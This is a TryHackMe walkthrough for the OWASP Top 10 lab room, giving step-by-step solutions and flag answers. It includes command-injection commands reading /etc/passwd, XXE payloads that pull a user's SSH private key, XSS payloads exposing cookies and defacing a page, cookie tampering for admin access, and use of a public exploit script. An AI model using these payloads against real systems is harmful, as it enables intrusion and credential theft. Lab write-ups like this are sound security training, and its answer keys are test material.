# OWASP Top 10 - TryHackMe 

Learn about and exploit each of the OWASP Top 10 vulnerabilities; the 10 most critical web security risks.

## Overview
- **Room URL:** [https://tryhackme.com/room/owasptop10](https://tryhackme.com/room/owasptop10)
- **Difficulty:** Easy
- **Time to complete:** 120

## Walkthrough
### 1. Introduction
*No hints needed!*

### 2. Accessing machines
```
Use your Linux machine connect via OpenVPN or start AttackBox
```

### 3. [Severity 1] Injection 
*No hints needed!*

### 4. [Severity 1] OS Command Injection
*No hints needed!*

### 5. [Severity 1] Command Injection Practical
- What strange text file is in the website root directory?
- Navigate to http://<MACHINE_IP>/evilshell.php and type `ls`

**=> Answer: `drpepper.txt`**

- <p>How many non-root/non-service/non-daemon users are there?<br /></p>
```bash
wc -l
```

**=> Answer: `0`**

- <p>What user is this app running as?<br /></p>
```bash
whoami
```

**=> Answer: `www-data`**

- <p>What is the user's shell set as?<br /></p>
```bash
grep 'www-data' /etc/passwd
```

**=> Answer: `/usr/sbin/nologin`**

- <p>What version of Ubuntu is running?<br /></p>
```bash
lsb_release -a
```

**=> Answer: `18.04.4`**

- <p>Print out the MOTD.  What favorite beverage is shown?<br /></p>
```bash
cat /etc/update-motd.d/00-header
```

**=> Answer: `dr pepper`**

### 6. [Severity 2] Broken Authentication
*No hints needed!*

### 7. [Severity 2] Broken Authentication Practical
- What is the flag that you found in darren's account?
```
Visit http://<MACHINE_IP>:8888 and register user " darren"
Log in with " darren" you will see the flag.
```

**=> Answer: `fe86079416a21a3c99937fea8874b667`**

- <p>What is the flag that you found in arthur's account?<br /></p>
```
Like darren do that same with " arthur"
```

**=> Answer: `d9acc0f7db4fda460ac3edeb75d75e16e`**

### 8. [Severity 3] Sensitive Data Exposure (Introduction)
*No hints needed!*

### 9. [Severity 3] Sensitive Data Exposure (Supporting Material 1)
*No hints needed!*

### 10. [Severity 3] Sensitive Data Exposure (Supporting Material 2)
*No hints needed!*

### 11. [Severity 3] Sensitive Data Exposure (Challenge)
- Have a look around the webapp. The developer has left themselves a note indicating that there is sensitive data in a specific directory. <br /><br />What is the name of the mentioned directory?
```
- Visit http://<MACHINE_IP> to take a look at the website.
- Go to /login page and view page source it.
- You will see a big note containing the sensitive folder.
```
**=> Answer: `/assets`**

- <p>Navigate to the directory you found in question one. What file stands out as being likely to contain sensitive data?<br /></p>
```
- Go to http://<MACHINE_IP>/assets
- There is a .db file
```
**=> Answer: `webapp.db`**

- <p>Use the supporting material to access the sensitive data. What is the password hash of the admin user?<br /></p>
```
- Click to the webapp.db and download the file
- Open terminal and run file ./webapp.db (it is a sqlite3 file)
- Run sqlite3 ./webapp.db
- Run .tables
- Run pragma table_info(users);
- Run select * from users;
- You will see the hash password of admin
```
![Guide Image](./screenshots/owasp-top-10-1.png)

**=> Answer: `6eea9b7ef19179a06954edd0f6c05ceb`**

- <p>Crack the hash.<br />What is the admin's plaintext password?<br /></p>
```
- Take the hash password to CrackStation.
```
**=> Answer: `qwertyuiop`**

- <p>Login as the admin. What is the flag?<br /></p>
```
- Visit http://<MACHINE_IP>/login
- Enter username: admin, password: qwertyuiop
- You will see the flag
```

**=> Answer: `THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}`**

### 12. [Severity 4] XML External Entity
*No hints needed!*

### 13. [Severity 4 XML External Entity - eXtensible Markup Language
- Full form of XML

**=> Answer: `eXtensible Markup Language`**

- <p>Is it compulsory to have XML prolog in XML documents?<br /></p>

**=> Answer: `No`**

- <p>Can we validate XML documents against a schema?<br /></p>

**=> Answer: `Yes`**

- <p>How can we specify XML version and encoding in XML document?<br /></p>

**=> Answer: `XML prolog`**

### 14. [Severity 4] XML External Entity - DTD
- How do you define a new ELEMENT?

**=> Answer: `!ELEMENT`**

- <p>How do you define a ROOT element?<br /></p>

**=> Answer: `!DOCTYPE`**

- <p>How do you define a new ENTITY?<br /></p>

**=> Answer: `!ENTITY`**

### 15. [Severity 4] XML External Entity - XXE Payload
*No hints needed!*

### 16. [Severity 4] XML External Entity - Exploiting
- <p>What is the name of the user in /etc/passwd<br /></p>
```
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM "file:///etc/passwd">]> 
<root>&read;</root>
```

![Guide Image](./screenshots/owasp-top-10-2.png)

- You can see the name:
```
falcon:x:1000:1000:falcon,,,:/home/falcon:/bin/bash
```

**=> Answer: `falcon`**

- <p>Where is falcon's SSH key located?<br /></p>
```
- We know the falcon is stored at /home/falcon
```

**=> Answer: `/home/falcon/.ssh/id_rsa`**

- <p>What are the first 18 characters for falcon's private key<br /></p>
```
<!DOCTYPE root [<!ENTITY read SYSTEM "file:///home/falcon/.ssh/id_rsa">]>
<root>&read;</root>
```
![Guide Image](./screenshots/owasp-top-10-3.png)

**=> Answer: `MIIEogIBAAKCAQEA7b`**

### 17. [Severity 5] Broken Access Control
*No hints needed!*

### 18. [Severity 5] Broken Access Control (IDOR Challenge)
- <p>Look at other users notes. What is the flag?<br /></p>
```
- Try the URL http://<MACHINE_IP>/note.php?note=0
```

**=> Answer: `flag{fivefourthree}`**

### 19. [Severity 6] Security Misconfiguration
- <p>Hack into the webapp, and find the flag!<br /></p>
```
- Visit http://<MACHINE_IP>
- You can see that this app named Pensive Notes
- Try search on GG with: Pensive Notes
- You will find this Gihub repo where the username and password are located: https://github.com/NinjaJc01/PensiveNotes
- Login with pensive:PensiveNotes
```

![Guide Image](./screenshots/owasp-top-10-4.png)

**=> Answer: `thm{4b9513968fd564a87b28aa1f9d672e17}`**

### 20. [Severity 7] Cross-site Scripting
- <p>Navigate to <a href="http://MACHINE_IP/" target="_blank">http://MACHINE_IP/</a> in your browser and click on the "Reflected XSS" tab on the navbar; craft a reflected XSS payload that will cause a popup saying "Hello".<br /></p>
```
- Type in the search bar: <script>alert(“Hello World”)</script>
```

![Guide Image](./screenshots/owasp-top-10-5.png)
![Guide Image](./screenshots/owasp-top-10-6.png)

**=> Answer: `ThereIsMoreToXSSThanYouThink`**

- <p>On the same reflective page, craft a reflected XSS payload that will cause a popup with your machines IP address.<br /></p>
```
- Type in the search bar: <script>alert(window.location.hostname)</script>
```

![Guide Image](./screenshots/owasp-top-10-7.png)
![Guide Image](./screenshots/owasp-top-10-8.png)

**=> Answer: `ReflectiveXss4TheWin`**

- <p>Now navigate to <a href="http://machine_ip/" target="_blank">http://MACHINE_IP/</a> in your browser and <span style="font-size:1rem">click on the "Stored XSS" tab on the navbar;</span><span style="font-size:1rem"> </span><span style="font-size:1rem">make an account.</span></p><p><span style="font-size:1rem">Then add a comment and see if you can insert some of your own HTML.</span></p>
```
- Create an account and visit "Stored XSS"
- Comment: <h1>Hello world!</h1>
```

![Guide Image](./screenshots/owasp-top-10-9.png)

**=> Answer: `HTML_T4gs`**

- <p>On the same page, c<span style="font-size:1rem">reate an alert popup box appear on the page with your document cookies.</span><br /></p>
```
- Comment: <script>alert(document.cookie)</script>
```

![Guide Image](./screenshots/owasp-top-10-10.png)
![Guide Image](./screenshots/owasp-top-10-11.png)

**=> Answer: `W3LL_D0N3_LVL2`**

- <p>Change "XSS Playground" to "I am a hacker" by adding a comment and using Javascript.<br /></p>
```
- Comment: <script>document.getElementById(id).innerHTML = “I am a hacker”</script>
```
**=> Answer: `websites_can_be_easily_defaced_with_xss`**

### 21. [Severity 8] Insecure Deserialization
- Who developed the Tomcat application?<br />

**=> Answer: `	The Apache Software Foundation`**

- <p>What type of attack that crashes services can be performed with insecure deserialization?<br /></p>

**=> Answer: `Denial of Service`**

### 22. [Severity 8] Insecure Deserialization - Objects
- <p>Select the correct term of the following statement:<br /></p><p><br /><i>if a dog was sleeping, would this be:</i></p><p><span style="font-size:1rem">A) A State<br /></span><span style="font-size:1rem">B) A Behaviour </span></p>

**=> Answer: `A Behaviour`**

### 23. [Severity 8] Insecure Deserialization - Deserialization
- What is the name of the base-2 formatting that data is sent across a network as? 

**=> Answer: `Binary`**

### 24. [Severity 8] Insecure Deserialization - Cookies
- If a cookie had the path of <i>webapp.com/login </i>, what would the URL that the user has to visit be?

**=> Answer: `webapp.com/login`**

- <p>What is the acronym for the web technology that <i>Secure</i> cookies work over?<br /></p>

**=> Answer: `HTTPS`**

### 25. [Severity 8] Insecure Deserialization - Cookies Practical
- 1st flag (cookie value)
```
- Visit http://<MACHINE_IP>/register and register an account
- Right-click Inspect and go to Storage -> Cookies
- You will see a cookie name: sessionid
```

![Guide image](./screenshots/owasp-top-10-12.png)
```
- It is base64 encoded so we have to decode it in order to get the flag.
- echo "<sessionid encoded>" >> session_hash.txt
- base64 --decode ./session_hash.txt
```

![Guide image](./screenshots/owasp-top-10-13.png)

**=> Answer: `THM{good_old_base64_huh}`**

- <p>2nd flag (admin dashboard)<br /></p>

```
- Change the session name: userType to value admin
- Visit http://<MACHINE_IP>/admin, you will get the flag
```

![Guide image](./screenshots/owasp-top-10-14.png)

**=> Answer: `THM{heres_the_admin_flag}`**

### 26. [Severity 8] Insecure Deserialization - Code Execution
- flag.txt
```
- Follow all the steps
- Try to find flag.txt via cd and ls
- cat flag.txt
```
**=> Answer: `4a69a7ff9fd68`**

### 27. [Severity 9] Components With Known Vulnerabilities 
*No hints needed!*

### 28. [Severity 9] Components With Known Vulnerabilities - Exploit
*No hints needed!*

### 29. [Severity 9] Components With Known Vulnerabilities - Lab
- How many characters are in /etc/passwd (use wc -c /etc/passwd to get the answer)

```
- Search on exploit-db, I can find an exploit: https://www.exploit-db.com/exploits/47887
- Copy the code to your local machine (via vim, notepad,...)
- Run it python3 ./your-hack-file.py http://<MACHINE_IP>
```

**=> Answer: `1611`**

### 30. [Severity 10] Insufficient Logging and Monitoring
- What IP address is the attacker using?

![Guide image](./screenshots/owasp-top-10-15.png)

**=> Answer: `49.99.13.16`**

- <p>What kind of attack is being carried out?<br /></p>

**=> Answer: `Brute Force`**

### 31. What Next?
*No hints needed!*